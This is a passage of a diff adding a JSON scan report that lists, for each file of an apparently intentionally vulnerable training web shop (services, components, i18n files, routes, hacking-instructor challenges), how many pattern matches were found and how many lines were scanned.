+        "file": "frontend/src/app/Services/chatbot.service.ts",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "frontend/src/app/Services/code-fixes.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 62
+      },
+      {
+        "file": "frontend/src/app/Services/code-fixes.service.ts",
+        "matches": 0,
+        "lines_scanned": 38
+      },
+      {
+        "file": "frontend/src/app/Services/code-snippet.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "frontend/src/app/Services/code-snippet.service.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "frontend/src/app/Services/complaint.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "frontend/src/app/Services/complaint.service.ts",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "frontend/src/app/Services/configuration.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 63
+      },
+      {
+        "file": "frontend/src/app/Services/configuration.service.ts",
+        "matches": 0,
+        "lines_scanned": 119
+      },
+      {
+        "file": "frontend/src/app/Services/country-mapping.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "frontend/src/app/Services/country-mapping.service.ts",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "frontend/src/app/Services/ctf-system-wide-notification.service.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "frontend/src/app/Services/data-subject.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 78
+      },
+      {
+        "file": "frontend/src/app/Services/data-subject.service.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "frontend/src/app/Services/delivery.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 74
+      },
+      {
+        "file": "frontend/src/app/Services/delivery.service.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "frontend/src/app/Services/feedback.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 106
+      },
+      {
+        "file": "frontend/src/app/Services/feedback.service.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "frontend/src/app/Services/form-submit.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "frontend/src/app/Services/form-submit.service.ts",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "frontend/src/app/Services/hint.service.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "frontend/src/app/Services/hints.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 81
+      },
+      {
+        "file": "frontend/src/app/Services/image-captcha.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 50
+      },
+      {
+        "file": "frontend/src/app/Services/image-captcha.service.ts",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "frontend/src/app/Services/keys.service.ts",
+        "matches": 0,
+        "lines_scanned": 74
+      },
+      {
+        "file": "frontend/src/app/Services/languages.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 53
+      },
+      {
+        "file": "frontend/src/app/Services/languages.service.ts",
+        "matches": 0,
+        "lines_scanned": 22
+      },
+      {
+        "file": "frontend/src/app/Services/local-backup.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 98
+      },
+      {
+        "file": "frontend/src/app/Services/local-backup.service.ts",
+        "matches": 0,
+        "lines_scanned": 101
+      },
+      {
+        "file": "frontend/src/app/Services/order-history.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 103
+      },
+      {
+        "file": "frontend/src/app/Services/order-history.service.ts",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": "frontend/src/app/Services/payment.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 102
+      },
+      {
+        "file": "frontend/src/app/Services/payment.service.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "frontend/src/app/Services/photo-wall.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 76
+      },
+      {
+        "file": "frontend/src/app/Services/photo-wall.service.ts",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/app/Services/product-review.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 109
+      },
+      {
+        "file": "frontend/src/app/Services/product-review.service.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "frontend/src/app/Services/product.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 94
+      },
+      {
+        "file": "frontend/src/app/Services/product.service.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "frontend/src/app/Services/quantity.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 79
+      },
+      {
+        "file": "frontend/src/app/Services/quantity.service.ts",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "frontend/src/app/Services/recycle.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "frontend/src/app/Services/recycle.service.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "frontend/src/app/Services/request.interceptor.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "frontend/src/app/Services/security-answer.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/app/Services/security-answer.service.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "frontend/src/app/Services/security-question.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 65
+      },
+      {
+        "file": "frontend/src/app/Services/security-question.service.ts",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/app/Services/snack-bar-helper.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 32
+      },
+      {
+        "file": "frontend/src/app/Services/snack-bar-helper.service.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "frontend/src/app/Services/socket-io.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "frontend/src/app/Services/socket-io.service.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "frontend/src/app/Services/track-order.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/app/Services/track-order.service.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "frontend/src/app/Services/two-factor-auth-service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 143
+      },
+      {
+        "file": "frontend/src/app/Services/two-factor-auth-service.ts",
+        "matches": 0,
+        "lines_scanned": 60
+      },
+      {
+        "file": "frontend/src/app/Services/user.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 233
+      },
+      {
+        "file": "frontend/src/app/Services/user.service.ts",
+        "matches": 0,
+        "lines_scanned": 82
+      },
+      {
+        "file": "frontend/src/app/Services/vuln-lines.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 45
+      },
+      {
+        "file": "frontend/src/app/Services/vuln-lines.service.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "frontend/src/app/Services/wallet.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 74
+      },
+      {
+        "file": "frontend/src/app/Services/wallet.service.ts",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "frontend/src/app/Services/window-ref.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "frontend/src/app/Services/window-ref.service.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "frontend/src/app/sidenav/sidenav.component.html",
+        "matches": 0,
+        "lines_scanned": 317
+      },
+      {
+        "file": "frontend/src/app/sidenav/sidenav.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 197
+      },
+      {
+        "file": "frontend/src/app/sidenav/sidenav.component.ts",
+        "matches": 0,
+        "lines_scanned": 167
+      },
+      {
+        "file": "frontend/src/app/token-sale/token-sale.component.html",
+        "matches": 0,
+        "lines_scanned": 103
+      },
+      {
+        "file": "frontend/src/app/token-sale/token-sale.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 58
+      },
+      {
+        "file": "frontend/src/app/token-sale/token-sale.component.ts",
+        "matches": 0,
+        "lines_scanned": 40
+      },
+      {
+        "file": "frontend/src/app/track-result/track-result.component.html",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "frontend/src/app/track-result/track-result.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 85
+      },
+      {
+        "file": "frontend/src/app/track-result/track-result.component.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth/two-factor-auth.component.html",
+        "matches": 0,
+        "lines_scanned": 102
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 158
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth/two-factor-auth.component.ts",
+        "matches": 0,
+        "lines_scanned": 125
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.html",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 127
+      },
+      {
+        "file": "frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.ts",
+        "matches": 0,
+        "lines_scanned": 72
+      },
+      {
+        "file": "frontend/src/app/user-details/user-details.component.html",
+        "matches": 0,
+        "lines_scanned": 45
+      },
+      {
+        "file": "frontend/src/app/user-details/user-details.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 64
+      },
+      {
+        "file": "frontend/src/app/user-details/user-details.component.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "frontend/src/app/wallet/wallet.component.html",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "frontend/src/app/wallet/wallet.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 102
+      },
+      {
+        "file": "frontend/src/app/wallet/wallet.component.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "frontend/src/app/wallet-web3/wallet-web3.component.html",
+        "matches": 0,
+        "lines_scanned": 73
+      },
+      {
+        "file": "frontend/src/app/wallet-web3/wallet-web3.component.ts",
+        "matches": 0,
+        "lines_scanned": 172
+      },
+      {
+        "file": "frontend/src/app/wallet-web3/wallet-web3.module.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/app/web3-sandbox/web3-sandbox.component.html",
+        "matches": 0,
+        "lines_scanned": 170
+      },
+      {
+        "file": "frontend/src/app/web3-sandbox/web3-sandbox.component.ts",
+        "matches": 0,
+        "lines_scanned": 315
+      },
+      {
+        "file": "frontend/src/app/web3-sandbox/web3-sandbox.module.ts",
+        "matches": 0,
+        "lines_scanned": 56
+      },
+      {
+        "file": "frontend/src/app/welcome/welcome.component.html",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "frontend/src/app/welcome/welcome.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "frontend/src/app/welcome/welcome.component.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "frontend/src/app/welcome-banner/welcome-banner.component.html",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/app/welcome-banner/welcome-banner.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 107
+      },
+      {
+        "file": "frontend/src/app/welcome-banner/welcome-banner.component.ts",
+        "matches": 0,
+        "lines_scanned": 70
+      },
+      {
+        "file": "frontend/src/assets/i18n/ar_SA.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/az_AZ.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/bg_BG.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/bn_BD.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ca_ES.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/cs_CZ.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/da_DK.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/de_CH.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/de_DE.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/el_GR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/en.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/es_ES.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/et_EE.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/fa_IR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/fi_FI.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/fr_FR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ga_IE.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/he_IL.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/hi_IN.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/hu_HU.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/id_ID.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/it_IT.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ja_JP.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ka_GE.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ko_KR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/lv_LV.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/my_MM.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/nl_NL.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/no_NO.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/pl_PL.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/pt_BR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/pt_PT.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ro_RO.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/ru_RU.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/si_LK.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/sv_SE.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/th_TH.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/tlh_AA.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/tr_TR.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/uk_UA.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/zh_CN.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/zh_HK.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/i18n/zh_TW.json",
+        "matches": 0,
+        "lines_scanned": 484
+      },
+      {
+        "file": "frontend/src/assets/private/CopyShader.js",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "frontend/src/assets/private/dat.gui.min.js",
+        "matches": 12,
+        "lines_scanned": 82
+      },
+      {
+        "file": "frontend/src/assets/private/EffectComposer.js",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "frontend/src/assets/private/MaskPass.js",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "frontend/src/assets/private/OrbitControls.js",
+        "matches": 0,
+        "lines_scanned": 583
+      },
+      {
+        "file": "frontend/src/assets/private/RenderPass.js",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/assets/private/ShaderPass.js",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/assets/private/stats.min.js",
+        "matches": 2,
+        "lines_scanned": 6
+      },
+      {
+        "file": "frontend/src/assets/private/three.js",
+        "matches": 6,
+        "lines_scanned": 38491
+      },
+      {
+        "file": "frontend/src/assets/private/threejs-demo.html",
+        "matches": 0,
+        "lines_scanned": 189
+      },
+      {
+        "file": "frontend/src/assets/public/ContractABIs.ts",
+        "matches": 0,
+        "lines_scanned": 1214
+      },
+      {
+        "file": "frontend/src/assets/public/css/dataErasure.css",
+        "matches": 0,
+        "lines_scanned": 140
+      },
+      {
+        "file": "frontend/src/assets/public/css/roboto.css",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "frontend/src/assets/public/css/userProfile.css",
+        "matches": 0,
+        "lines_scanned": 60
+      },
+      {
+        "file": "frontend/src/confetti/index.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "frontend/src/environments/environment.prod.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "frontend/src/environments/environment.ts",
+        "matches": 0,
+        "lines_scanned": 21
+      },
+      {
+        "file": "frontend/src/hacking-instructor/index.ts",
+        "matches": 2,
+        "lines_scanned": 226
+      },
+      {
+        "file": "frontend/src/hacking-instructor/tutorialUnavailable.ts",
+        "matches": 0,
+        "lines_scanned": 33
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/adminSection.ts",
+        "matches": 0,
+        "lines_scanned": 106
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/bonusPayload.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/codingChallenges.ts",
+        "matches": 0,
+        "lines_scanned": 92
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/domXss.ts",
+        "matches": 0,
+        "lines_scanned": 114
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/exposedCredentials.ts",
+        "matches": 0,
+        "lines_scanned": 75
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/forgedFeedback.ts",
+        "matches": 0,
+        "lines_scanned": 82
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/loginAdmin.ts",
+        "matches": 0,
+        "lines_scanned": 129
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/loginBender.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/loginJim.ts",
+        "matches": 0,
+        "lines_scanned": 105
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/passwordStrength.ts",
+        "matches": 0,
+        "lines_scanned": 88
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/privacyPolicy.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/reflectedXss.ts",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/scoreBoard.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "frontend/src/hacking-instructor/challenges/viewBasket.ts",
+        "matches": 0,
+        "lines_scanned": 97
+      },
+      {
+        "file": "frontend/src/hacking-instructor/helpers/helpers.ts",
+        "matches": 1,
+        "lines_scanned": 272
+      },
+      {
+        "file": "ftp/suspicious_errors.yml",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "lib/accuracy.ts",
+        "matches": 0,
+        "lines_scanned": 70
+      },
+      {
+        "file": "lib/antiCheat.ts",
+        "matches": 0,
+        "lines_scanned": 166
+      },
+      {
+        "file": "lib/botUtils.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "lib/challengeUtils.ts",
+        "matches": 0,
+        "lines_scanned": 130
+      },
+      {
+        "file": "lib/codingChallenges.ts",
+        "matches": 2,
+        "lines_scanned": 112
+      },
+      {
+        "file": "lib/config.types.ts",
+        "matches": 0,
+        "lines_scanned": 141
+      },
+      {
+        "file": "lib/insecurity.ts",
+        "matches": 0,
+        "lines_scanned": 201
+      },
+      {
+        "file": "lib/is-docker.ts",
+        "matches": 0,
+        "lines_scanned": 31
+      },
+      {
+        "file": "lib/is-heroku.ts",
+        "matches": 0,
+        "lines_scanned": 4
+      },
+      {
+        "file": "lib/is-windows.ts",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "lib/logger.ts",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "lib/noUpdate.ts",
+        "matches": 0,
+        "lines_scanned": 53
+      },
+      {
+        "file": "lib/utils.ts",
+        "matches": 0,
+        "lines_scanned": 234
+      },
+      {
+        "file": "lib/webhook.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "lib/startup/cleanupFtpFolder.ts",
+        "matches": 0,
+        "lines_scanned": 21
+      },
+      {
+        "file": "lib/startup/customizeApplication.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "lib/startup/customizeEasterEgg.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "lib/startup/registerWebsocketEvents.ts",
+        "matches": 0,
+        "lines_scanned": 56
+      },
+      {
+        "file": "lib/startup/restoreOverwrittenFilesWithOriginals.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "lib/startup/validateChatBot.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "lib/startup/validateConfig.ts",
+        "matches": 0,
+        "lines_scanned": 193
+      },
+      {
+        "file": "lib/startup/validateDependencies.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "lib/startup/validateDependenciesBasic.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "lib/startup/validatePreconditions.ts",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "models/address.ts",
+        "matches": 0,
+        "lines_scanned": 75
+      },
+      {
+        "file": "models/basket.ts",
+        "matches": 0,
+        "lines_scanned": 49
+      },
+      {
+        "file": "models/basketitem.ts",
+        "matches": 0,
+        "lines_scanned": 49
+      },
+      {
+        "file": "models/captcha.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "models/card.ts",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "models/challenge.ts",
+        "matches": 0,
+        "lines_scanned": 182
+      },
+      {
+        "file": "models/complaint.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "models/delivery.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "models/feedback.ts",
+        "matches": 0,
+        "lines_scanned": 76
+      },
+      {
+        "file": "models/hint.ts",
+        "matches": 0,
+        "lines_scanned": 56
+      },
+      {
+        "file": "models/imageCaptcha.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "models/index.ts",
+        "matches": 0,
+        "lines_scanned": 64
+      },
+      {
+        "file": "models/memory.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "models/privacyRequests.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "models/product.ts",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "models/quantity.ts",
+        "matches": 0,
+        "lines_scanned": 59
+      },
+      {
+        "file": "models/recycle.ts",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "models/relations.ts",
+        "matches": 0,
+        "lines_scanned": 145
+      },
+      {
+        "file": "models/securityAnswer.ts",
+        "matches": 0,
+        "lines_scanned": 57
+      },
+      {
+        "file": "models/securityQuestion.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "models/user.ts",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "models/wallet.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "monitoring/grafana-dashboard.json",
+        "matches": 0,
+        "lines_scanned": 2113
+      },
+      {
+        "file": "routes/2fa.ts",
+        "matches": 0,
+        "lines_scanned": 176
+      },
+      {
+        "file": "routes/address.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "routes/angular.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "routes/appConfiguration.ts",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "routes/appVersion.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "routes/authenticatedUsers.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "routes/b2bOrder.ts",
+        "matches": 0,
+        "lines_scanned": 47
+      },
+      {
+        "file": "routes/basket.ts",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "routes/basketItems.ts",
+        "matches": 0,
+        "lines_scanned": 101
+      },
+      {
+        "file": "routes/captcha.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "routes/changePassword.ts",
+        "matches": 0,
+        "lines_scanned": 61
+      },
+      {
+        "file": "routes/chatbot.ts",
+        "matches": 0,
+        "lines_scanned": 256
+      },
+      {
+        "file": "routes/checkKeys.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "routes/continueCode.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "routes/countryMapping.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "routes/coupon.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "routes/createProductReviews.ts",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": "routes/currentUser.ts",
+        "matches": 0,
+        "lines_scanned": 61
+      },
+      {
+        "file": "routes/dataErasure.ts",
+        "matches": 0,
+        "lines_scanned": 96
+      },
+      {
+        "file": "routes/dataExport.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "routes/delivery.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "routes/deluxe.ts",
+        "matches": 0,
+        "lines_scanned": 70
+      },
+      {
+        "file": "routes/easterEgg.ts",
+        "matches": 0,
+        "lines_scanned": 16
+      },
+      {
+        "file": "routes/fileServer.ts",
+        "matches": 0,
+        "lines_scanned": 55
+      },
+      {
+        "file": "routes/fileUpload.ts",
+        "matches": 0,
+        "lines_scanned": 148
+      },
+      {
+        "file": "routes/imageCaptcha.ts",
+        "matches": 0,
+        "lines_scanned": 60
+      },
+      {
+        "file": "routes/keyServer.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "routes/languages.ts",
+        "matches": 0,
+        "lines_scanned": 90
+      },
+      {
+        "file": "routes/likeProductReviews.ts",
+        "matches": 0,
+        "lines_scanned": 62
+      },
+      {
+        "file": "routes/logfileServer.ts",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "routes/login.ts",
+        "matches": 1,
+        "lines_scanned": 84
+      },
+      {
+        "file": "routes/memory.ts",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "routes/metrics.ts",
+        "matches": 0,
+        "lines_scanned": 211
+      },
+      {
+        "file": "routes/nftMint.ts",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "routes/order.ts",
+        "matches": 0,
+        "lines_scanned": 211
+      },
+      {
+        "file": "routes/orderHistory.ts",
+        "matches": 0,
+        "lines_scanned": 39
+      },
+      {
+        "file": "routes/payment.ts",
+        "matches": 0,
+        "lines_scanned": 77
+      },
+      {
+        "file": "routes/premiumReward.ts",
+        "matches": 0,
+        "lines_scanned": 16
+      },
+      {
+        "file": "routes/privacyPolicyProof.ts",
+        "matches": 0,
+        "lines_scanned": 16
+      },
+      {
+        "file": "routes/profileImageFileUpload.ts",
+        "matches": 0,
+        "lines_scanned": 59
+      },
+      {
+        "file": "routes/profileImageUrlUpload.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "routes/quarantineServer.ts",
+        "matches": 0,
